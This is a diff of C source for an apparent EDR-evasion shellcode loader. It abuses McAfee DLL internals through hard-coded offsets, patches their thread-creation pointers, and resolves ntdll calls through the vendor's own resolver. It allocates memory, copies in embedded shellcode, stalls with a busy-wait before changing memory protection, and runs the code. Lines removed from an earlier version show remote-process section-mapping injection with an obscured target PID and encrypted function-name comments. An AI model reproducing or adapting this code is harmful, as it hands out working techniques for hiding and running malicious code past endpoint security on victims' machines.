@@ -2,50 +2,29 @@
 #include <windows.h>
 #include "CWLInc.h"
 #include <time.h>
+
+// Defining the functions that we want to re-utilize
 typedef DWORD(__cdecl* ResolvProcAddress)(LPCSTR moduleName, LPCSTR procName, FARPROC* fp);
 typedef HANDLE(__stdcall* CreateUserOrRemoteThread)(void* p1, void* p2, void* v3);
-void MyMessage() {
-	MessageBoxA(NULL, "Hello", "Hello", MB_OK);
-}
+typedef LPVOID(__cdecl* AllocHeap)(SIZE_T dwBytes);
+
 enum MfeHCInjOffset {
 	LdLibrary = 0x2DFBF,
 	ProcAddr = 0x2E059,
-	CUT = 0x7FB44,
-	CRT = 0x7FB50,
-	CURTFunc = 0x97B0
+	CUT = 0x7FB44, // CreateUserThread
+	CRT = 0x7FB50, // CreateRemoteThread
+	CURTFunc = 0x97B0,
+	MemAlloc = 0x53D91
+
 };
 
 enum MfeHcTheOffset {
-	ResProcAddr = 0x015C0
+	RslvProcAddr = 0x015C0,
 };
 
-void DelayExecution() {
-	// delaying before NtProtect
-	long delay = 0x20;
-	time_t current = time(0);
-	long stop = current + delay;
-	while (1)
-	{
-		current = time(0);
-		if (current >= stop)
-			break;
-	}
-}
-
 int main(int argc, char** argv) {
-	//if (argc < 2) {
-	//	perror("[-] EdrMyFriend.exe PID\n");
-	//	return -1;
-	//}
-	//int a_pid = atoi(argv[1]);
-	//if (a_pid == 0) {
-	//	perror("[-] Invalid PID\n");
-	//	return -1;
-	//}
-	int a_pid = 11636 ^ 90;
 
 	HANDLE hProcess = INVALID_HANDLE_VALUE;
-	//hProcess = GetCurrentProcess();
 	HMODULE hMfehcinj;
 	HMODULE hMfehcthe;
 	HANDLE hSection;
@@ -59,7 +38,8 @@ int main(int argc, char** argv) {
 	}
 	printf("[+] Module is loaded at base address: %p\n", hMfehcinj);
 
-	ResolvProcAddress pResolveProcAddress = (ResolvProcAddress)((ULONG_PTR)hMfehcthe + ResProcAddr);
+	ResolvProcAddress pResolveProcAddress = (ResolvProcAddress)((ULONG_PTR)hMfehcthe + RslvProcAddr);
+	// Exit if it doesn't matches this function signature
 	if (memcmp(pResolveProcAddress, "\x56\xFF\x74\x24\x08", 5) != 0) {
 		exit(-1);
 	}
@@ -86,83 +66,57 @@ int main(int argc, char** argv) {
 		"\x68\x6f\x6d\x20\x43\x68\x6f\x20\x46\x72\x68\x48\x65\x6c\x6c"
 		"\x31\xc9\x88\x4c\x24\x1b\x89\xe1\x31\xd2\x6a\x30\x53\x51\x52"
 		"\xff\xd0\x31\xc0\x50\xff\x55\x08";
-	// All resolved Functions || key = CyberWarFare.live || rc4 || base64
+
 	FARPROC procAddr;
-	_NtMapViewOfSection fpNtMapViewOfSection = NULL; // nGbyNLD8CWF5UxlmuQt4+0ca
-	_NtCreateSection fpNtCreateSection = NULL; // nGb8J6XLFGFdeRxBtQdi
-	_ZwOpenProcess fpZwOpenProcess = NULL; //iGXwJaXEMHZhfxpGrw==
-	// TO:DO encrypt/decrypt module name and function name
-	pResolveProcAddress("ntdll.dll", "NtMapViewOfSection", &procAddr);
-	fpNtMapViewOfSection = (_NtMapViewOfSection)procAddr;
-	if (fpNtMapViewOfSection == NULL) {
-		printf("[+] Function nGbyNLD8CWF5UxlmuQt4+0ca is not Resolved ");
+	_NtAllocateVirtualMemory fpNtAllocVirtualMemory = NULL;
+	_NtProtectVirtualMemory fpNtProtectVirtualMemory = NULL;
+	pResolveProcAddress("ntdll.dll", "NtAllocateVirtualMemory", &procAddr);
+	fpNtAllocVirtualMemory = (_NtAllocateVirtualMemory)procAddr;
+	if (fpNtAllocVirtualMemory == NULL) {
+		printf("[+] Error finding Function _NtAllocVirtualMemory \n");
 		exit(-1);
 	}
-	pResolveProcAddress("ntdll.dll", "NtCreateSection", &procAddr);
-	fpNtCreateSection = (_NtCreateSection)procAddr;
-	if (fpNtCreateSection == NULL) {
-		printf("[+] Function nGb8J6XLFGFdeRxBtQdi is not Resolved");
+	pResolveProcAddress("ntdll.dll", "NtProtectVirtualMemory", &procAddr);
+	fpNtProtectVirtualMemory = (_NtProtectVirtualMemory)procAddr;
+	if (fpNtProtectVirtualMemory == NULL) {
+		printf("[+] Error finding Function _NtProtectVirtualMemory \n");
 		exit(-1);
 	}
-	pResolveProcAddress("ntdll.dll", "ZwOpenProcess", &procAddr);
-	fpZwOpenProcess = (_ZwOpenProcess)procAddr;
-	if (fpZwOpenProcess == NULL) {
-		printf("[+] Function iGXwJaXEMHZhfxpGrw== is not Resolved");
-		exit(-1);
-	}
-	// CreateSection
-	SIZE_T scSize = sizeof(buf);
-	LARGE_INTEGER lScSize = { scSize };
-	status = fpNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE | MAXIMUM_ALLOWED,
-		NULL, (PLARGE_INTEGER)&lScSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
-	if (!NT_SUCCESS(status)) {
-		perror("[+] Error on Creating Section\n");
-		exit(-1);
-	}
-	printf("[+] Section Created\n");
-	DelayExecution();
-	// Map view of section to local process
-	PVOID localSectionBaseAddr = { 0 };
-	PVOID remoteSectionBaseAddr = { 0 };
-	status = fpNtMapViewOfSection(hSection, GetCurrentProcess(), &localSectionBaseAddr, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_READWRITE);
-	if (!NT_SUCCESS(status)) {
-		perror("[+] Error on NtMapViewOfSection Local\n");
-		exit(-1);
-	}
-	DelayExecution();
-	printf("[+] Mapped view to local process\n");
-	CLIENT_ID pid;
-	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
-	pid.UniqueProcess = (HANDLE)(a_pid ^ 90);
-	pid.UniqueThread = (HANDLE)0;
-	// Getting handle to target process
-	fpZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &pid);
-	if (hProcess == INVALID_HANDLE_VALUE) {
-		printf("[-] Invalid Handle Value \n");
-	}
-	printf("[+] Got handle to the process %d\n", (DWORD)hProcess);
-	DelayExecution();
-	// Map view of section to target process
-	status = fpNtMapViewOfSection(hSection, hProcess, &remoteSectionBaseAddr, NULL, NULL, NULL, &scSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);
-	if (!NT_SUCCESS(status)) {
-		perror("[+] Error on NtMapViewOfSection Remote\n");
-		exit(-1);
-	}
-	printf("[+] Mapped view to remote process\n");
+	// Overiting Global value of RtlCreateuserThread / CreateRemoteThreadEx
 	DWORD CUTPatchAddr = ((ULONG_PTR)hMfehcinj + CUT);
-	DWORD CUTPatchBytes = 0x0;
+	pResolveProcAddress("ntdll.dll", "RtlCreateUserThread", &procAddr);
+	DWORD CUTPatchBytes = (DWORD)procAddr;
 	DWORD CRTPatchAddr = ((ULONG_PTR)hMfehcinj + CRT);
-	pResolveProcAddress("kernel32.dll", "CreateRemoteThreadEx", &procAddr);
-	DWORD CRTPatchBytes = (DWORD)procAddr;
+	//pResolveProcAddress("kernel32.dll", "CreateRemoteThreadEx", &procAddr);
+	DWORD CRTPatchBytes = 0x0;
+	// Setting CreateUserThread
 	memcpy((void*)CUTPatchAddr, &CUTPatchBytes, sizeof(DWORD));
+	// Setting CreateRemoteThread
 	memcpy((void*)CRTPatchAddr, &CRTPatchBytes, sizeof(DWORD));
-	DelayExecution();
-	printf("[+] Copying payload to mapped section...\n");
-	memcpy((void*)localSectionBaseAddr, &buf, scSize);
-	LPTHREAD_START_ROUTINE runME = (LPTHREAD_START_ROUTINE)remoteSectionBaseAddr;
-	DelayExecution();
-	printf("[+] Executing...\n");
+
+	// Allocating Virtual Memory
+	PVOID scBase = { 0 };
+	SIZE_T scSize = sizeof(buf);
+	status = fpNtAllocVirtualMemory(GetCurrentProcess(), &scBase, 0, &scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	// Writing Shellcode to Allocated memory
+	memcpy(scBase, &buf, scSize);
+	DWORD oldProtect;
+	printf("[+] ooooooooo....\n");
+	// delaying before NtProtect
+	long delay = 0x20;
+	time_t current = time(0);
+	long stop = current + delay;
+	while (1)
+	{
+		current = time(0);
+		if (current >= stop)
+			break;
+	}
+	// Changing MemProtection
+	status = fpNtProtectVirtualMemory(GetCurrentProcess(), &scBase, &scSize, PAGE_EXECUTE_READ, &oldProtect);
+	LPTHREAD_START_ROUTINE runME = (LPTHREAD_START_ROUTINE)scBase;
 	// Crafting Remote Thread
+	printf("[+] Executing....\n");
 	CreateUserOrRemoteThread createUserOrRemoteThread = (CreateUserOrRemoteThread)((UINT_PTR)hMfehcinj + CURTFunc);
 	createUserOrRemoteThread((void*)hProcess, (void*)runME, (void*)0);
 	system("pause");
